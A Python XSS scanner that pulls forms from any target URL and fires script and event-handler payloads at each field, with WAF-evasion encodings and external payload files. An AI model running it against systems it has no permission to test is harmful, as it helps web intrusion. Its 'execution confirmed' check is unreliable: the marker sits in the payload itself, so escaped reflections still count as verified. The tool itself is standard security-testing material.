#!/usr/bin/env python3
"""
XSS POST Scanner - AlZill V6 Pro
Advanced XSS detection with Context-Aware verification, WAF bypass, Multi-form extraction
Features: External payloads | Smart encoding detection | HTML entity verification | Form extraction
"""

import requests
from termcolor import cprint
import re
import json
import random
import string
import os
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from typing import List, Dict, Optional, Tuple

INFO = "cyan"
SUCCESS = "green"
WARNING = "yellow"
ERROR = "red"
HIGHLIGHT = "magenta"


class XSSPostScanner:
    def __init__(self, timeout: int = 8, verbose: bool = False, payloads_file: str = "payloads.txt"):
        self.timeout = timeout
        self.verbose = verbose
        self.payloads_file = payloads_file
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # ============================================================
        # XSS TEST MARKERS (لتأكيد التنفيذ)
        # ============================================================
        self.test_marker = f"ALZILL_XSS_{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
        
        # ============================================================
        # HTML ENTITIES PATTERNS (لكشف التشفير)
        # ============================================================
        self.html_entities = [
            '&lt;', '&gt;', '&amp;', '&quot;', '&#39;', '&apos;',
            '&#x3C;', '&#x3E;', '&#x22;', '&#x27;'
        ]
        
        # ============================================================
        # LOAD XSS PAYLOADS FROM EXTERNAL FILE
        # ============================================================
        self.payloads = self._load_payloads()
        
        # ============================================================
        # WAF BYPASS TECHNIQUES
        # ============================================================
        self.bypass_techniques = [
            ('raw', self._raw),
            ('random_case', self._random_case),
            ('double_encode', self._double_encode),
            ('hex_encode', self._hex_encode),
            ('unicode_encode', self._unicode_encode),
            ('tab_bypass', self._tab_bypass),
            ('newline_bypass', self._newline_bypass),
        ]
    
    # ============================================================
    # LOAD PAYLOADS FROM EXTERNAL FILE
    # ============================================================
    
    def _load_payloads(self) -> List[Tuple[str, str]]:
        """Load XSS payloads from payloads.txt"""
        payloads = []
        
        # Default fallback payloads
        default_payloads = [
            ("<script>alert(1)</script>", "Basic Script"),
            ("<img src=x onerror=alert(1)>", "Image Event"),
            ("<svg onload=alert(1)>", "SVG Event"),
            ("javascript:alert(1)", "JS Protocol"),
            ("\"><script>alert(1)</script>", "Quote Breakout"),
        ]
        
        if not os.path.exists(self.payloads_file):
            cprint(f"[!] Payloads file not found, using defaults", WARNING)
            return default_payloads
        
        try:
            with open(self.payloads_file, 'r', encoding='utf-8') as f:
                content = f.read()
            
            current_section = None
            xss_count = 0
            
            for line in content.split('\n'):
                line = line.strip()
                
                if not line or line.startswith('#'):
                    continue
                
                if line.startswith('[') and line.endswith(']'):
                    current_section = line[1:-1].upper()
                    continue
                
                # Load XSS payloads from [XSS] section
                if current_section == 'XSS':
                    payloads.append((line, "External Payload"))
                    xss_count += 1
            
            # Add marker payload for confirmation
            payloads.append((f"<script>document.write('{self.test_marker}')</script>", "Marker Test"))
            payloads.append((f"<img src=x onerror=document.write('{self.test_marker}')>", "Marker Image"))
            payloads.append((f"<svg/onload=document.write('{self.test_marker}')>", "Marker SVG"))
            
            if xss_count > 0:
                cprint(f"\n[+] Loaded {xss_count} XSS payloads from {self.payloads_file}", SUCCESS)
                return payloads
            else:
                cprint(f"[!] No XSS payloads found in {self.payloads_file}, using defaults", WARNING)
                
        except Exception as e:
            cprint(f"[!] Error loading payloads: {e}", WARNING)
        
        return default_payloads
    
    # ============================================================
    # WAF BYPASS TECHNIQUES
    # ============================================================
    
    def _raw(self, payload: str) -> str:
        return payload
    
    def _random_case(self, payload: str) -> str:
        """Random case variation (ScRiPt)"""
        return ''.join(c.upper() if random.choice([True, False]) else c.lower() for c in payload)
    
    def _double_encode(self, payload: str) -> str:
        """Double URL encoding"""
        import urllib.parse
        return urllib.parse.quote(urllib.parse.quote(payload))
    
    def _hex_encode(self, payload: str) -> str:
        """Hex encoding for some characters"""
        return ''.join(f'\\x{ord(c):02x}' if c.isalnum() else c for c in payload)
    
    def _unicode_encode(self, payload: str) -> str:
        """Unicode encoding"""
        return ''.join(f'\\u{ord(c):04x}' if c.isalnum() else c for c in payload)
    
    def _tab_bypass(self, payload: str) -> str:
        """Tab bypass for WAF"""
        return payload.replace('<', '<%09').replace('>', '%09>')
    
    def _newline_bypass(self, payload: str) -> str:
        """Newline bypass for WAF"""
        return payload.replace('<', '<%0a').replace('>', '%0a>')
    
    # ============================================================
    # CONTEXT-AWARE DETECTION (Smart verification)
    # ============================================================
    
    def _is_html_escaped(self, text: str, payload: str) -> bool:
        """Check if payload is HTML escaped"""
        for entity in self.html_entities:
            if entity in text and payload.replace('<', '&lt;').replace('>', '&gt;') in text:
                return True
        return False
    
    def _has_dangerous_chars(self, text: str) -> bool:
        """Check for unescaped dangerous characters"""
        dangerous = ['<', '>', '"', "'", '(', ')']
        for char in dangerous:
            if char in text:
                if char not in text.replace('&lt;', '<').replace('&gt;', '>').replace('&quot;', '"'):
                    return True
        return False
    
    def _verify_execution(self, response_text: str) -> bool:
        """Verify actual JavaScript execution via marker"""
        return self.test_marker in response_text
    
    # ============================================================
    # FORM EXTRACTION (Professional)
    # ============================================================
    
    def extract_forms(self, url: str) -> List[Dict]:
        """Extract all forms with all input types (input, textarea, select)"""
        forms = []
        
        try:
            response = self.session.get(url, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            for form in soup.find_all('form'):
                form_info = {
                    'action': form.get('action', url),
                    'method': form.get('method', 'GET').upper(),
                    'fields': [],
                    'enctype': form.get('enctype', 'application/x-www-form-urlencoded')
                }
                
                form_info['action'] = urljoin(url, form_info['action'])
                
                for input_tag in form.find_all('input'):
                    field = {
                        'name': input_tag.get('name', ''),
                        'type': input_tag.get('type', 'text'),
                        'value': input_tag.get('value', '')
                    }
                    if field['name']:
                        form_info['fields'].append(field)
                
                for textarea in form.find_all('textarea'):
                    field = {
                        'name': textarea.get('name', ''),
                        'type': 'textarea',
                        'value': textarea.get_text()
                    }
                    if field['name']:
                        form_info['fields'].append(field)
                
                for select in form.find_all('select'):
                    field = {
                        'name': select.get('name', ''),
                        'type': 'select',
                        'value': ''
                    }
                    if field['name']:
                        form_info['fields'].append(field)
                
                for button in form.find_all('button'):
                    if button.get('name') and button.get('type') != 'button':
                        field = {
                            'name': button.get('name'),
                            'type': 'button',
                            'value': button.get('value', '')
                        }
                        form_info['fields'].append(field)
                
                if form_info['fields']:
                    forms.append(form_info)
                    
        except Exception as e:
            if self.verbose:
                cprint(f"[!] Form extraction error: {e}", WARNING)
        
        return forms
    
    # ============================================================
    # TEST FUNCTION
    # ============================================================
    
    def test_field(self, url: str, field: Dict, form_action: str, form_method: str) -> Optional[Dict]:
        """Test a single field with all payloads and bypass techniques"""
        
        for payload, payload_type in self.payloads:
            for bypass_name, bypass_func in self.bypass_techniques:
                try:
                    test_payload = bypass_func(payload)
                    data = {field['name']: test_payload}
                    
                    if form_method == 'POST':
                        response = self.session.post(form_action, data=data, timeout=self.timeout)
                    else:
                        response = self.session.get(form_action, params=data, timeout=self.timeout)
                    
                    if self._verify_execution(response.text):
                        return {
                            'type': payload_type,
                            'field': field['name'],
                            'payload': test_payload[:80],
                            'bypass': bypass_name,
                            'confidence': 100,
                            'verified': True
                        }
                    
                    if self._has_dangerous_chars(response.text):
                        if '<' in test_payload and '<' in response.text:
                            if not self._is_html_escaped(response.text, test_payload):
                                return {
                                    'type': payload_type,
                                    'field': field['name'],
                                    'payload': test_payload[:80],
                                    'bypass': bypass_name,
                                    'confidence': 85,
                                    'verified': False
                                }
                    
                except Exception as e:
                    if self.verbose:
                        cprint(f"    Error testing {field['name']}: {e}", WARNING)
        
        return None
    
    # ============================================================
    # MAIN SCAN FUNCTION
    # ============================================================
    
    def scan(self, url: str) -> bool:
        """Main scanning function"""
        
        cprint("\n" + "="*70, HIGHLIGHT)
        cprint("[XSS POST SCAN] AlZill V6 Pro - External Payloads", HIGHLIGHT, attrs=['bold'])
        cprint("="*70, HIGHLIGHT)
        cprint(f"[*] Target: {url}", INFO)
        cprint("[*] Features: Context-Aware | WAF Bypass | Form Extraction", "yellow")
        cprint("[*] Verification: HTML Entity Detection | Unescaped Characters | Execution Marker", "yellow")
        cprint(f"[*] Payloads: External from {self.payloads_file}", "yellow")
        
        forms = self.extract_forms(url)
        
        if not forms:
            cprint("[!] No forms found on the page", WARNING)
            return False
        
        cprint(f"[+] Found {len(forms)} form(s) with {sum(len(f['fields']) for f in forms)} total fields", SUCCESS)
        
        vulnerabilities = []
        
        for form_idx, form in enumerate(forms, 1):
            cprint(f"\n[Form #{form_idx}] Action: {form['action']} (Method: {form['method']})", INFO)
            cprint(f"    Fields: {', '.join([f['name'] for f in form['fields'][:5]])}", INFO)
            
            for field in form['fields']:
                if self.verbose:
                    cprint(f"\n    Testing field: {field['name']} (type: {field['type']})", INFO)
                
                result = self.test_field(url, field, form['action'], form['method'])
                
                if result:
                    vulnerabilities.append(result)
                    cprint(f"\n    ✅ XSS FOUND in field '{field['name']}'!", ERROR)
                    cprint(f"       Type: {result['type']}", WARNING)
                    cprint(f"       Bypass: {result['bypass']}", INFO)
                    cprint(f"       Confidence: {result['confidence']}%", SUCCESS if result['confidence'] == 100 else WARNING)
        
        self._display_results(vulnerabilities)
        
        return len(vulnerabilities) > 0
    
    def _display_results(self, vulnerabilities: List[Dict]):
        """Display scan results"""
        
        cprint("\n" + "="*70, HIGHLIGHT)
        cprint("📊 XSS SCAN RESULTS", HIGHLIGHT, attrs=['bold'])
        cprint("="*70, HIGHLIGHT)
        
        if vulnerabilities:
            cprint(f"\n[!!!] {len(vulnerabilities)} XSS VULNERABILITIES DETECTED!", ERROR, attrs=['bold'])
            
            for i, vuln in enumerate(vulnerabilities, 1):
                cprint(f"\n  [{i}] Type: {vuln['type']}", ERROR)
                cprint(f"      Field: {vuln['field']}", INFO)
                cprint(f"      Payload: {vuln['payload']}", "yellow")
                cprint(f"      Bypass Used: {vuln['bypass']}", INFO)
                cprint(f"      Confidence: {vuln['confidence']}%", SUCCESS if vuln['confidence'] == 100 else WARNING)
                
                if vuln['verified']:
                    cprint(f"      Status: ✅ VERIFIED (execution confirmed)", SUCCESS)
                else:
                    cprint(f"      Status: ⚠️ POTENTIAL (requires manual verification)", WARNING)
        else:
            cprint(f"\n[✓] NO XSS VULNERABILITIES FOUND", SUCCESS)
            cprint(f"    All tests passed with smart verification", INFO)
        
        cprint("\n" + "="*70 + "\n", HIGHLIGHT)


# ============================================================
# LEGACY FUNCTION
# ============================================================

def scan(url: str, verbose: bool = False, payloads_file: str = "payloads.txt") -> bool:
    """Legacy scan function"""
    scanner = XSSPostScanner(verbose=verbose, payloads_file=payloads_file)
    return scanner.scan(url)


if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        target = sys.argv[1]
        verbose = '--verbose' in sys.argv or '-v' in sys.argv
        payloads_file = sys.argv[2] if len(sys.argv) > 2 else "payloads.txt"
        scan(target, verbose=verbose, payloads_file=payloads_file)
    else:
        print("Usage: python xss_post_scanner.py <target_url> [payloads_file] [--verbose]")
        print("Example: python xss_post_scanner.py https://example.com/search --verbose")